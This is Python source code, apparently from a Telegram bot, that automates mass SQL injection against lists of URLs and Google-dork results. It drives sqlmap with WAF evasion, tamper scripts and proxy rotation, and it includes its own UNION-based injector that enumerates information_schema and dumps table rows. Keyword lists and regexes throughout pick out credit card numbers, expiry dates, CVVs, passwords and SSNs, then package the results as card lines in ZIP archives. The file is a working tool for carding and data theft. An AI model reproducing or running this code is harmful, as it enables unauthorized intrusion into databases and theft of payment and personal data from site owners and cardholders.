def _parse_fingerprint(item: dict, result: ApiTaskResult):
    val = item.get("value", "")
    itype = item.get("type", 0)
    if isinstance(val, str):
        low = val.lower()
        if "banner" in low:
            result.banner = val
        elif "current user" in low or "current_user" in low:
            result.current_user = val
        elif "current database" in low or "current_db" in low:
            result.current_db = val


def _parse_log_fingerprint(log: str, result: ApiTaskResult):
    for line in log.splitlines():
        ll = line.lower()
        if "the back-end dbms is" in ll or "banner:" in ll:
            if not result.banner:
                result.banner = line.strip()
        if "current user is" in ll or "current database is" in ll:
            if not result.current_db:
                result.current_db = line.strip()


# ══════════════════════════════════════════════════════════════════════════════
#  MULTI-URL BATCH DUMP (replaces sqlmap_dumper.sqlmap_dump_multiple)
# ══════════════════════════════════════════════════════════════════════════════

async def api_dump_multiple(
    urls: List[str],
    *,
    proxy_list:     List[str] = None,
    proxy_file_path: str      = None,
    level:     int  = DEFAULT_LEVEL,
    risk:      int  = DEFAULT_RISK,
    technique: str  = DEFAULT_TECHNIQUE,
    threads:   int  = DEFAULT_THREADS,
    tamper:    str  = DEFAULT_TAMPER,
    crawl_depth: int = 0,
    task_timeout: int = DEFAULT_TIMEOUT,
    max_concurrent: int = DEFAULT_MAX_CONC,
    stop_event: Optional[asyncio.Event] = None,
    progress_cb: Optional[Callable]     = None,
    per_result_cb: Optional[Callable]   = None,
    log_sample_cb: Optional[Callable]   = None,
) -> List[ApiTaskResult]:
    """
    Dump multiple URLs via sqlmap REST API concurrently.

    per_result_cb(result, zip_bytes)   — called per successful dump
    progress_cb(done, total, successes) — called after each task
    log_sample_cb(url, line)            — called with live sqlmap log lines
    """
    if not await ensure_api_server():
        return []

    sem       = asyncio.Semaphore(max_concurrent)
    results: List[ApiTaskResult] = []
    done_cnt  = [0]
    base_tmp  = tempfile.mkdtemp(prefix="loop_api_")

    # Write proxy file if we have a list
    _proxy_file = proxy_file_path
    if proxy_list and not _proxy_file:
        pf = os.path.join(base_tmp, "proxies.txt")
        with open(pf, "w") as f:
            f.write("\n".join(proxy_list))
        _proxy_file = pf

    async def _one(idx: int, url: str):
        if stop_event and stop_event.is_set():
            done_cnt[0] += 1
            return

        url_dir = os.path.join(base_tmp, f"t{idx}")
        os.makedirs(url_dir, exist_ok=True)

        proxy_url = random.choice(proxy_list) if proxy_list else None

        opts = build_options(
            url,
            level        = level,
            risk         = risk,
            technique    = technique,
            threads      = threads,
            tamper       = tamper,
            proxy        = proxy_url,
            proxy_file   = _proxy_file,
            crawl_depth  = crawl_depth,
        )

        def _log_line(line):
            if log_sample_cb:
                try:
                    log_sample_cb(url, line)
                except Exception:
                    pass

        async with sem:
            r = await run_api_task(
                opts,
                task_timeout   = task_timeout,
                log_cb         = _log_line,
                stop_event     = stop_event,
                csv_output_dir = url_dir,
            )

        done_cnt[0] += 1
        if r.success:
            results.append(r)
            if per_result_cb:
                # Use the real sqlmap output dir (r.csv_dir) for zip if available,
                # fall back to our temp url_dir
                zip_src = r.csv_dir if (r.csv_dir and os.path.isdir(r.csv_dir)) else url_dir
                zip_bytes = _zip_dir(zip_src)
                # If the real dir had nothing try the sqlmap global output root
                if not zip_bytes:
                    sqlmap_root = os.path.expanduser("~/.sqlmap/output")
                    if os.path.isdir(sqlmap_root):
                        zip_bytes = _zip_dir(sqlmap_root)
                try:
                    await per_result_cb(r, zip_bytes)
                except Exception:
                    pass

        if progress_cb:
            try:
                await progress_cb(done_cnt[0], len(urls), len(results))
            except Exception:
                pass

    tasks = [_one(i + 1, u) for i, u in enumerate(urls)]
    await asyncio.gather(*tasks, return_exceptions=True)

    shutil.rmtree(base_tmp, ignore_errors=True)
    return results


# ══════════════════════════════════════════════════════════════════════════════
#  GOOGLE DORK DIRECT ➪ sqlmap (god-tier shortcut)
# ══════════════════════════════════════════════════════════════════════════════

async def api_google_dork_dump(
    dork: str,
    *,
    proxy_list:  List[str] = None,
    level:    int  = DEFAULT_LEVEL,
    risk:     int  = DEFAULT_RISK,
    technique: str = DEFAULT_TECHNIQUE,
    threads:  int  = DEFAULT_THREADS,
    tamper:   str  = DEFAULT_TAMPER,
    task_timeout: int = DEFAULT_TIMEOUT,
    stop_event: Optional[asyncio.Event] = None,
    log_cb: Optional[Callable]          = None,
    per_result_cb: Optional[Callable]   = None,
) -> ApiTaskResult:
    """
    Pass a Google dork directly to sqlmap via --google-dork.
    sqlmap fetches the Google results itself and tests all URLs.
    """
    if not await ensure_api_server():
        result = ApiTaskResult(url=dork)
        result.error = "sqlmapapi server unavailable"
        return result

    proxy_url = random.choice(proxy_list) if proxy_list else None
    opts = build_options(
        None,
        google_dork  = dork,
        level        = level,
        risk         = risk,
        technique    = technique,
        threads      = threads,
        tamper       = tamper,
        proxy        = proxy_url,
    )

    tmp_dir = tempfile.mkdtemp(prefix="loop_dork_")
    try:
        result = await run_api_task(
            opts,
            task_timeout   = task_timeout,
            log_cb         = log_cb,
            stop_event     = stop_event,
            csv_output_dir = tmp_dir,
        )
        if result.success and per_result_cb:
            zip_bytes = _zip_dir(tmp_dir)
            await per_result_cb(result, zip_bytes)
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    return result


# ══════════════════════════════════════════════════════════════════════════════
#  BULK FILE DUMP  (write URLs to file ➪ sqlmap --bulk-file)
# ══════════════════════════════════════════════════════════════════════════════

async def api_bulk_dump(
    urls: List[str],
    *,
    proxy_list:   List[str] = None,
    level:    int  = DEFAULT_LEVEL,
    risk:     int  = DEFAULT_RISK,
    technique: str = DEFAULT_TECHNIQUE,
    threads:  int  = DEFAULT_THREADS,
    tamper:   str  = DEFAULT_TAMPER,
    task_timeout: int = DEFAULT_TIMEOUT,
    stop_event: Optional[asyncio.Event] = None,
    log_cb: Optional[Callable]          = None,
) -> ApiTaskResult:
    """
    Write URLs to a temp file and pass to sqlmap via --bulk-file.
    sqlmap tests all URLs in one process (more efficient for large lists).
    """
    if not await ensure_api_server():
        result = ApiTaskResult()
        result.error = "sqlmapapi server unavailable"
        return result

    tmp_dir  = tempfile.mkdtemp(prefix="loop_bulk_")
    url_file = os.path.join(tmp_dir, "urls.txt")
    with open(url_file, "w") as f:
        f.write("\n".join(urls))

    proxy_url = random.choice(proxy_list) if proxy_list else None
    opts = build_options(
        None,
        bulk_file    = url_file,
        level        = level,
        risk         = risk,
        technique    = technique,
        threads      = threads,
        tamper       = tamper,
        proxy        = proxy_url,
    )

    try:
        result = await run_api_task(
            opts,
            task_timeout   = task_timeout,
            log_cb         = log_cb,
            stop_event     = stop_event,
            csv_output_dir = tmp_dir,
        )
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    return result


# ══════════════════════════════════════════════════════════════════════════════
#  CANCEL a running task by taskid
# ══════════════════════════════════════════════════════════════════════════════

async def cancel_task(taskid: str) -> bool:
    """Kill a running sqlmap scan by taskid. Returns True on success."""
    try:
        async with aiohttp.ClientSession(timeout=API_TIMEOUT) as sess:
            resp = await _get(sess, f"/scan/{taskid}/kill")
            return resp.get("success", False)
    except Exception:
        return False


# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def _zip_dir(directory: str) -> bytes:
    """Pack a directory into an in-memory ZIP. Returns bytes."""
    buf = io.BytesIO()
    has = False
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(directory):
            for fname in files:
                fp  = os.path.join(root, fname)
                arc = os.path.relpath(fp, directory)
                zf.write(fp, arc)
                has = True
    buf.seek(0)
    return buf.read() if has else b""


def get_tamper_list() -> List[str]:
    """Return available tamper scripts from sqlmap package."""
    tampers = []
    if _SQLMAP_PKG_DIR:
        td = os.path.join(_SQLMAP_PKG_DIR, "tamper")
        if os.path.isdir(td):
            tampers = sorted(
                Path(td).glob("*.py"),
                key=lambda p: p.name
            )
            tampers = [p.stem for p in tampers]
    return tampers


def format_result_summary(result: ApiTaskResult) -> str:
    """Format a premium Doctor SQL-style result summary."""
    lines = []
    sep = "─" * 32

    if result.error and not result.success:
        lines.append(f"✗ Error: {result.error}")
        return "\n".join(lines)

    # Header with severity badge
    sev = getattr(result, "severity", SEVERITY_INFO)
    lines.append(f"✅ ɪɴᴊᴇᴄᴛᴇᴅ  {sev}")
    lines.append(f"🌐 {result.url[:70]}")
    lines.append(sep)

    # DBMS identification (Doctor SQL style)
    dbms_str = getattr(result, "dbms", "") or result.banner
    if dbms_str:
        lines.append(f"🗄️  ᴅʙᴍs: {dbms_str[:80]}")
    if result.current_db:
        lines.append(f"📂 ᴅᴀᴛᴀʙᴀsᴇ: {result.current_db[:60]}")
    if result.current_user:
        lines.append(f"👤 ᴜsᴇʀ: {result.current_user[:60]}")
    if result.dbs:
        lines.append(f"📤 ᴅʙ's ғᴏᴜɴᴅ: {', '.join(result.dbs[:6])}")

    # Tables
    if result.tables:
        lines.append(f"📋 ᴛᴀʙʟᴇs ᴅᴜᴍᴘᴇᴅ: {len(result.tables)}")

    # CC cards
    if result.cards:
        lines.append(f"💳 ᴄᴀʀᴅs: {len(result.cards)}")

    # Doctor SQL keyword matches
    km = getattr(result, "keyword_matches", {})
    if km:
        lines.append(sep)
        lines.append("🔑 Sᴇɴsɪᴛɪᴠᴇ Cᴏʟᴜᴍɴs Dᴇᴛᴇᴄᴛᴇᴅ:")
        cat_icons = {
            "ᴄᴄ": "💳", "ᴄvᴠ": "🔐", "ᴇxᴘɪʀʏ": "📅",
            "ᴘᴀss": "🔑", "ᴇᴍᴀɪʟ": "📧", "ᴜsᴇʀɴᴀᴍᴇ": "👤",
            "ssɴ": "🪪", "ᴘʜᴏɴᴇ": "📱", "ᴀᴅᴅʀᴇss": "🏠", "ᴛᴏᴋᴇɴ": "🎫",
        }
        for cat, pairs in km.items():
            icon = cat_icons.get(cat, "•")
            tables_shown = ", ".join(f"{t}.{c}" for t, c in pairs[:3])
            lines.append(f"  {icon} {cat.upper()}: {tables_shown}")

    # Auto-dump pairs
    ap = getattr(result, "auto_pairs", [])
    if ap:
        lines.append("🚜 Aᴜᴛᴏ-Dᴜᴍᴘ Pᴀɪʀs:")
        for tname, c1, c2, pair_name in ap[:4]:
            lines.append(f"  ▸ [{pair_name}] in `{tname}` ➪ {c1} : {c2}")

    return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════
#   DB DUMPER
# ══════════════════════════════════════════════════════════════════════

# ── CONFIG ────────────────────────────────────────────────────────────────────
_TIMEOUT   = 5      # seconds — fast fail
_MAX_COLS  = 10     # try up to 10 columns
_DUMP_ROWS = 800    # rows per table
_UA        = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

_SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql", "mysql_fetch_array",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate", "ora-0", "pg::syntax", "sqlite3::",
    "odbc sql", "division by zero",
    "supplied argument is not a valid mysql",
    "unterminated string literal", "syntax error",
]

# Tables most likely to contain financial/user data
_INTERESTING = [
    "card", "cc", "credit", "debit", "payment", "checkout", "billing",
    "transaction", "order", "orders", "customer", "customers",
    "account", "accounts", "user", "users", "member", "members",
    "shop", "purchase", "purchases", "finance", "wallet",
]

# Column keywords that suggest card-related data
_CARD_COLS = ["card", "cc_", "ccnum", "cardnum", "number", "pan",
              "expir", "expire", "exp_", "month", "year", "cvv", "cvc",
              "pin", "pass", "password", "email", "name", "phone"]


# ── HTTP HELPERS ──────────────────────────────────────────────────────────────

async def _get(session: aiohttp.ClientSession, url: str, proxy_url: str) -> str:
    try:
        kw = {
            "timeout": aiohttp.ClientTimeout(total=_TIMEOUT),
            "ssl":     False,
            "allow_redirects": True,
            "headers": {"User-Agent": _UA},
        }
        if proxy_url:
            kw["proxy"] = proxy_url
        async with session.get(url, **kw) as r:
            if r.status in (200, 500):
                return await r.text(errors="ignore")
    except Exception:
        pass
    return ""


def _has_db_error(html: str) -> bool:
    low = html.lower()
    return any(e in low for e in _SQL_ERRORS)


# ── INJECTION HELPERS ─────────────────────────────────────────────────────────

def _inject_param(url: str, payload: str) -> str:
    """Inject payload into the first query parameter value."""
    try:
        p  = urlparse(url)
        qs = parse_qs(p.query, keep_blank_values=True)
        if not qs:
            return url
        key = list(qs.keys())[0]
        new_qs = {k: [v[0]] for k, v in qs.items()}
        new_qs[key] = [qs[key][0] + payload]
        return urlunparse(p._replace(query=urlencode(new_qs, doseq=True)))
    except Exception:
        return url


def _extract_markers(html: str, marker_start="LBOT", marker_end="LBOT") -> list:
    return re.findall(r"LBOT(.*?)LBOT", html, re.DOTALL)


def _hex(s: str) -> str:
    return "0x" + s.encode("utf-8").hex()


def _concat_marker(expr: str) -> str:
    return f"CONCAT(0x4c424f54,{expr},0x4c424f54)"   # LBOT + expr + LBOT


# ── ❀ Sᴛᴇᴘ 1: DETECT COLUMN COUNT ───────────────────────────────────────────────

async def detect_columns(session: aiohttp.ClientSession, url: str, proxy_url: str) -> int:
    """ORDER BY 1,2,3… until error. Returns column count."""
    baseline = await _get(session, url, proxy_url)
    base_len = len(baseline)

    # Run all ORDER BY probes concurrently for speed
    async def _probe_order(n):
        test_url = _inject_param(url, f"' ORDER BY {n} -- -")
        html     = await _get(session, test_url, proxy_url)
        return n, html, len(html)

    tasks   = [_probe_order(n) for n in range(1, _MAX_COLS + 1)]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    for n, html, hlen in sorted(
        [r for r in results if isinstance(r, tuple)], key=lambda x: x[0]
    ):
        if _has_db_error(html) or (n > 1 and abs(hlen - base_len) > 2000):
            return max(n - 1, 1)

    # Fallback: UNION NULL probe
    for n in range(1, _MAX_COLS + 1):
        nulls    = ",".join(["NULL"] * n)
        test_url = _inject_param(url, f"' UNION SELECT {nulls} -- -")
        html     = await _get(session, test_url, proxy_url)
        if html and not _has_db_error(html) and len(html) > 100:
            return n

    return 3


# ── ❀ Sᴛᴇᴘ 2: FIND INJECTABLE COLUMN ───────────────────────────────────────────

async def find_col_pos(session: aiohttp.ClientSession, url: str,
                       num_cols: int, proxy_url: str) -> int:
    """Try each column slot concurrently. Returns index of first visible column."""
    marker = _hex("loopBOT_MARKER")

    async def _try_col(i):
        cols    = ["NULL"] * num_cols
        cols[i] = marker
        payload  = "' UNION SELECT " + ",".join(cols) + " -- -"
        test_url = _inject_param(url, payload)
        html     = await _get(session, test_url, proxy_url)
        return i, html and "loopBOT_MARKER" in html

    results = await asyncio.gather(*[_try_col(i) for i in range(num_cols)],
                                   return_exceptions=True)
    for r in results:
        if isinstance(r, tuple) and r[1]:
            return r[0]
    return 0


# ── ❀ Sᴛᴇᴘ 3: GENERIC UNION QUERY ──────────────────────────────────────────────

async def union_query(session: aiohttp.ClientSession, url: str,
                      num_cols: int, col_pos: int,
                      sql_expr: str, proxy_url: str) -> list:
    cols          = ["NULL"] * num_cols
    cols[col_pos] = _concat_marker(sql_expr)
    payload       = "' UNION SELECT " + ",".join(cols) + " -- -"
    test_url      = _inject_param(url, payload)
    html          = await _get(session, test_url, proxy_url)
    return _extract_markers(html)


# ── ❀ Sᴛᴇᴘ 4: GET DATABASE NAME ─────────────────────────────────────────────────

async def get_database(session, url, num_cols, col_pos, proxy_url) -> str:
    results = await union_query(session, url, num_cols, col_pos, "database()", proxy_url)
    return results[0].strip() if results else ""


# ── ❀ Sᴛᴇᴘ 5: GET TABLE LIST ───────────────────────────────────────────────────

async def get_tables(session, url, num_cols, col_pos, proxy_url, db_name: str) -> list:
    expr = "GROUP_CONCAT(DISTINCT table_name ORDER BY table_name SEPARATOR 0x2c)"
    if db_name:
        expr_full = f"(SELECT {expr} FROM information_schema.tables WHERE table_schema={_hex(db_name)} AND table_type='BASE TABLE')"
    else:
        expr_full = f"(SELECT {expr} FROM information_schema.tables WHERE table_schema=database() AND table_type='BASE TABLE')"

    results = await union_query(session, url, num_cols, col_pos, expr_full, proxy_url)

    tables = []
    for r in results:
        for t in r.split(","):
            t = t.strip()
            if t and len(t) < 80:
                tables.append(t)
    return tables


# ── ❀ Sᴛᴇᴘ 6: GET COLUMN NAMES ─────────────────────────────────────────────────

async def get_columns(session, url, num_cols, col_pos, proxy_url,
                      table_name: str, db_name: str) -> list:
    expr = "GROUP_CONCAT(DISTINCT column_name ORDER BY ordinal_position SEPARATOR 0x2c)"
    if db_name:
        expr_full = f"(SELECT {expr} FROM information_schema.columns WHERE table_name={_hex(table_name)} AND table_schema={_hex(db_name)})"
    else:
        expr_full = f"(SELECT {expr} FROM information_schema.columns WHERE table_name={_hex(table_name)} AND table_schema=database())"

    results = await union_query(session, url, num_cols, col_pos, expr_full, proxy_url)

    cols = []
    for r in results:
        for c in r.split(","):
            c = c.strip()
            if c and len(c) < 80:
                cols.append(c)
    return cols


# ── ❀ Sᴛᴇᴘ 7: DUMP TABLE ROWS ──────────────────────────────────────────────────

async def dump_table_rows(session, url, num_cols, col_pos, proxy_url,
                          table_name: str, columns: list,
                          db_name: str, limit: int = _DUMP_ROWS) -> list:
    cols_to_dump = columns[:10]
    sep_pipe     = "0x7c"
    sep_row      = "0x0a"

    concat = f"CONCAT({','.join(f'IFNULL({c},0x2d),{sep_pipe}' for c in cols_to_dump[:-1])},IFNULL({cols_to_dump[-1]},0x2d))"

    if db_name:
        expr_full = f"(SELECT GROUP_CONCAT({concat} SEPARATOR {sep_row}) FROM {db_name}.{table_name} LIMIT {limit})"
    else:
        expr_full = f"(SELECT GROUP_CONCAT({concat} SEPARATOR {sep_row}) FROM {table_name} LIMIT {limit})"

    results = await union_query(session, url, num_cols, col_pos, expr_full, proxy_url)

    rows = []
    for r in results:
        for line in r.split("\n"):
            line = line.strip()
            if line and line != "-" and len(line) > 2:
                rows.append(line)
    return rows


# ── CARD PATTERN PARSER ───────────────────────────────────────────────────────

_CARD_RE = re.compile(r"\b(4[0-9]{12}(?:[0-9]{3,6})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})\b")
_EXP_RE  = re.compile(r"\b(0?[1-9]|1[0-2])[/\-|,](2[0-9]|20[0-9]{2})\b")
_CVV_RE  = re.compile(r"\b([0-9]{3,4})\b")


def parse_card_rows(rows: list) -> list:
    """Scan dumped rows for CC patterns. Returns `number|MM|YY|cvv` lines."""
    cards = []
    seen  = set()

    for row in rows:
        card_m = _CARD_RE.search(row)
        if not card_m:
            continue
        card_num = card_m.group(1)

        exp_m = _EXP_RE.search(row)
        if exp_m:
            month = exp_m.group(1).zfill(2)
            year  = exp_m.group(2)
            if len(year) == 4:
                year = year[2:]
        else:
            month = "??"
            year  = "??"

        cvv = "???"
        for c in _CVV_RE.findall(row):
            if c in card_num:
                continue
            if c == year or c == ("20" + year):
                continue
            if len(c) in (3, 4):
                cvv = c
                break

        entry = f"{card_num}|{month}|{year}|{cvv}"
        if entry not in seen:
            seen.add(entry)
            cards.append(entry)

    return cards


# ── MAIN DUMP FUNCTION ────────────────────────────────────────────────────────

class DumpResult:
    def __init__(self):
        self.url       = ""
        self.db_name   = ""
        self.tables    = []
        self.dumped    = {}    # table_name ➪ raw rows
        self.cards     = []    # parsed CC lines
        self.raw_rows  = []    # all raw rows combined
        self.error     = ""
        self.col_count = 0
        self.col_pos   = 0


async def dump_url(url: str, proxy_url: str = "",
                   stop_event: asyncio.Event = None,
                   proxy_list: list = None) -> DumpResult:
    """Full automatic SQLi dump pipeline for one URL.
    If proxy_list is provided, a random proxy is picked per URL (overrides proxy_url).
    """
    if proxy_list:
        proxy_url = _pick_proxy(proxy_list)
    result     = DumpResult()
    result.url = url

    # 40 connections per dump — max speed
    connector = aiohttp.TCPConnector(limit=40, ssl=False, ttl_dns_cache=600)
    async with aiohttp.ClientSession(connector=connector) as session:

        # Step 1 — detect columns (now concurrent probes)
        num_cols = await detect_columns(session, url, proxy_url)
        result.col_count = num_cols
        if num_cols < 1:
            result.error = "Could not detect column count"
            return result

        # Step 2 — find injectable column (concurrent)
        col_pos = await find_col_pos(session, url, num_cols, proxy_url)
        result.col_pos = col_pos

        # Step 3 — get DB name
        if stop_event and stop_event.is_set():
            result.error = "Stopped"
            return result
        db_name = await get_database(session, url, num_cols, col_pos, proxy_url)
        result.db_name = db_name

        # Step 4 — list tables
        if stop_event and stop_event.is_set():
            result.error = "Stopped"
            return result
        tables = await get_tables(session, url, num_cols, col_pos, proxy_url, db_name)
        result.tables = tables

        if not tables:
            result.error = "No tables retrieved"
            return result

        # Step 5 — pick interesting tables first
        interesting = [t for t in tables if any(kw in t.lower() for kw in _INTERESTING)]
        if not interesting:
            interesting = tables[:8]

        # Step 6+7 — get columns and dump rows (run tables concurrently)
        async def _dump_table(table: str):
            if stop_event and stop_event.is_set():
                return
            cols = await get_columns(session, url, num_cols, col_pos, proxy_url, table, db_name)
            if not cols:
                return
            priority = sorted(cols, key=lambda c: (
                -sum(1 for kw in _CARD_COLS if kw in c.lower())
            ))
            rows = await dump_table_rows(
                session, url, num_cols, col_pos, proxy_url,
                table, priority, db_name
            )
            if rows:
                result.dumped[table] = rows
                result.raw_rows.extend(rows)
                result.cards.extend(parse_card_rows(rows))

        # Dump up to 6 interesting tables concurrently
        await asyncio.gather(*[_dump_table(t) for t in interesting[:6]],
                             return_exceptions=True)

    return result


# ── MULTI-URL DUMPER ──────────────────────────────────────────────────────────

async def dump_multiple(
    urls: list,
    proxy_url: str = "",
    stop_event: asyncio.Event = None,
    progress_cb=None,
    max_concurrent: int = 20,   # max concurrent dumps
    proxy_list: list = None,    # multi-proxy pool — each URL picks a different proxy
) -> list:
    """Dump multiple URLs concurrently. Returns DumpResult list with data.

    If proxy_list is provided, each URL dump rotates through a different proxy
    from the pool — maximises speed when using multiple proxies.
    """
    if proxy_list is None:
        proxy_list = []
    # Build resolved list of http://... URLs
    if not proxy_list and proxy_url:
        proxy_list = [proxy_url]

    sem     = asyncio.Semaphore(max_concurrent)
    results = []
    done    = [0]

    async def _one(url):
        if stop_event and stop_event.is_set():
            return
        async with sem:
            r = await dump_url(url, "", stop_event, proxy_list=proxy_list)
            done[0] += 1
            if r.raw_rows or r.cards:
                results.append(r)
            if progress_cb:
                try:
                    await progress_cb(done[0], len(urls), len(results))
                except Exception:
                    pass

    await asyncio.gather(*[_one(u) for u in urls], return_exceptions=True)
    return results


# ══════════════════════════════════════════════════════════════════════
#   SQLMAP SUBPROCESS DUMPER
# ══════════════════════════════════════════════════════════════════════

SQLMAP_BIN = os.path.join(os.path.dirname(sys.executable), "sqlmap")
if not os.path.isfile(SQLMAP_BIN):
    SQLMAP_BIN = shutil.which("sqlmap") or "sqlmap"

# ── Timeouts / limits ────────────────────────────────────────────────────────
PER_URL_TIMEOUT    = 420    # seconds per URL (sqlmap can be slow with level5)
MAX_CONCURRENT     = 20     # sqlmap processes at once
SQLMAP_THREADS     = 25     # HTTP threads inside each sqlmap process
SQLMAP_LEVEL       = 3      # 1-5  — 3 is fast+thorough balance
SQLMAP_RISK        = 2      # 1-3  — 2 is speed+coverage balance
SQLMAP_TECHNIQUE   = "BEUSTQ"  # Boolean, Error, Union, Stacked, Time, hQuery
SQLMAP_TAMPER      = "space2comment,between,charencode"

# ── CC pattern regexes ───────────────────────────────────────────────────────
_CARD_RE = re.compile(
    r"\b(4[0-9]{12}(?:[0-9]{3,6})?"         # Visa
    r"|5[1-5][0-9]{14}"                      # MC
    r"|3[47][0-9]{13}"                       # Amex
    r"|6(?:011|5[0-9]{2})[0-9]{12}"         # Discover
    r"|(?:2131|1800|35\d{3})\d{11})\b"      # JCB
)
_EXP_RE  = re.compile(r"\b(0?[1-9]|1[0-2])[/\-|,](2[0-9]|20[0-9]{2})\b")
_CVV_RE  = re.compile(r"\b([0-9]{3,4})\b")



# ── Build sqlmap command ──────────────────────────────────────────────────────

def _build_cmd(url: str, output_dir: str, proxy_url: str = "") -> list:
    cmd = [
        SQLMAP_BIN,
        "-u", url,
        "--batch",
        "--dump-all",
        "--level",     str(SQLMAP_LEVEL),
        "--risk",      str(SQLMAP_RISK),
        "--threads",   str(SQLMAP_THREADS),
        "--random-agent",
        "--forms",
        "--technique", SQLMAP_TECHNIQUE,
        "--tamper",    SQLMAP_TAMPER,
        "--skip-waf",
        "--timeout",   "10",
        "--retries",   "2",
        "--output-dir", output_dir,
        "--flush-session",
        "-v", "0",     # minimal verbosity (only results)
    ]
    if proxy_url:
        cmd += ["--proxy", proxy_url]
    return cmd


# ── Parse CC cards from CSV files ────────────────────────────────────────────

def _extract_cards_from_csv(csv_path: str) -> list:
    """Read a sqlmap-generated CSV and return card strings: num|MM|YY|cvv."""
    cards = []
    seen  = set()
    try:
        with open(csv_path, encoding="utf-8", errors="ignore") as f:
            reader = csv.reader(f)
            for row in reader:
                row_str = " ".join(str(c) for c in row)
                card_m  = _CARD_RE.search(row_str)
                if not card_m:
                    continue
                card_num = card_m.group(1)

                exp_m = _EXP_RE.search(row_str)
                if exp_m:
                    month = exp_m.group(1).zfill(2)
                    year  = exp_m.group(2)
                    if len(year) == 4:
                        year = year[2:]
                else:
                    month, year = "??", "??"

                cvv = "???"
                for c in _CVV_RE.findall(row_str):
                    if c in card_num:
                        continue
                    if c == year or c == ("20" + year):
                        continue
                    if len(c) in (3, 4):
                        cvv = c
                        break

                entry = f"{card_num}|{month}|{year}|{cvv}"
                if entry not in seen:
                    seen.add(entry)
                    cards.append(entry)
    except Exception:
        pass
    return cards


def _scan_output_for_cards(output_dir: str) -> list:
    """Walk sqlmap output_dir, read every CSV, extract CC patterns."""
    cards = []
    seen  = set()
    for root, _, files in os.walk(output_dir):
        for fname in files:
            if fname.lower().endswith(".csv"):
                for card in _extract_cards_from_csv(os.path.join(root, fname)):
                    if card not in seen:
                        seen.add(card)
                        cards.append(card)
    return cards


def _parse_sqlmap_success(stdout: str) -> bool:
    """Return True if sqlmap found/dumped something."""
    low = stdout.lower()
    return any(k in low for k in [
        "is vulnerable", "fetched data logged", "dumped to",
        "database management system", "retrieved:", "table:", "[info]",
        "backend dbms:", "found a total of",
    ])


# ── Single URL dump ───────────────────────────────────────────────────────────

class SqlmapResult:
    def __init__(self):
        self.url        = ""
        self.success    = False
        self.cards      = []
        self.csv_files  = 0
        self.output_dir = ""
        self.log        = ""
        self.error      = ""


async def sqlmap_dump_url(
    url: str,
    output_dir: str,
    proxy_url: str = "",
    stop_event: asyncio.Event = None,
) -> SqlmapResult:
    result     = SqlmapResult()
    result.url = url

    cmd = _build_cmd(url, output_dir, proxy_url)
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            env={**os.environ, "PYTHONUNBUFFERED": "1"},
        )

        async def _kill_on_stop():
            if stop_event:
                await stop_event.wait()
                try:
                    proc.kill()
                except Exception:
                    pass

        killer = asyncio.create_task(_kill_on_stop()) if stop_event else None

        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=PER_URL_TIMEOUT)
            log = stdout.decode(errors="ignore")
        except asyncio.TimeoutError:
            try:
                proc.kill()
            except Exception:
                pass
            result.error = "timeout"
            return result
        finally:
            if killer and not killer.done():
                killer.cancel()

        result.log     = log
        result.success = _parse_sqlmap_success(log)
        result.cards   = _scan_output_for_cards(output_dir)
        result.csv_files = sum(
            1 for r, _, fs in os.walk(output_dir) for f in fs if f.endswith(".csv")
        )
    except Exception as e:
        result.error = str(e)

    return result


# ── ZIP helper ────────────────────────────────────────────────────────────────

def zip_output(output_dir: str) -> bytes:
    """Pack entire sqlmap output_dir into an in-memory ZIP. Returns bytes."""
    buf = io.BytesIO()
    has = False
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(output_dir):
            for fname in files:
                fp = os.path.join(root, fname)
                zf.write(fp, os.path.relpath(fp, output_dir))
                has = True
    buf.seek(0)
    return buf.read() if has else b""


# ── Multi-URL concurrent dumper ───────────────────────────────────────────────

async def sqlmap_dump_multiple(
    urls: list,
    base_dir: str,
    proxy_list: list = None,
    stop_event: asyncio.Event = None,
    progress_cb=None,          # async fn(done, total, success_count)
    max_concurrent: int = MAX_CONCURRENT,
    per_result_cb=None,        # async fn(result, zip_bytes) — called per success
) -> list:
    """
    Dump multiple URLs with sqlmap concurrently.
    Returns list of SqlmapResult where success=True.
    """
    if proxy_list is None:
        proxy_list = []

    sem      = asyncio.Semaphore(max_concurrent)
    results  = []
    done_cnt = [0]

    async def _one(idx: int, url: str):
        nonlocal results
        if stop_event and stop_event.is_set():
            done_cnt[0] += 1
            return

        url_dir = os.path.join(base_dir, f"target_{idx}")
        os.makedirs(url_dir, exist_ok=True)
        proxy_url = _pick_proxy(proxy_list)

        async with sem:
            r = await sqlmap_dump_url(url, url_dir, proxy_url, stop_event)

        done_cnt[0] += 1
        if r.success:
            results.append(r)
            if per_result_cb:
                zip_bytes = zip_output(url_dir)
                try:
                    await per_result_cb(r, zip_bytes)
                except Exception:
                    pass

        if progress_cb:
            try:
                await progress_cb(done_cnt[0], len(urls), len(results))
            except Exception:
                pass

    tasks = [_one(i + 1, u) for i, u in enumerate(urls)]
    await asyncio.gather(*tasks, return_exceptions=True)
    return results


# ══════════════════════════════════════════════════════════════════════
#   MAIN BOT
# ══════════════════════════════════════════════════════════════════════


import os
import io
import json
import time
import asyncio
import itertools
import random
import shutil
import string
import tempfile
import logging
import re
import aiohttp
from datetime import datetime, timedelta
from typing import List, Set
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)
from telegram.constants import ParseMode
from telegram.request import HTTPXRequest


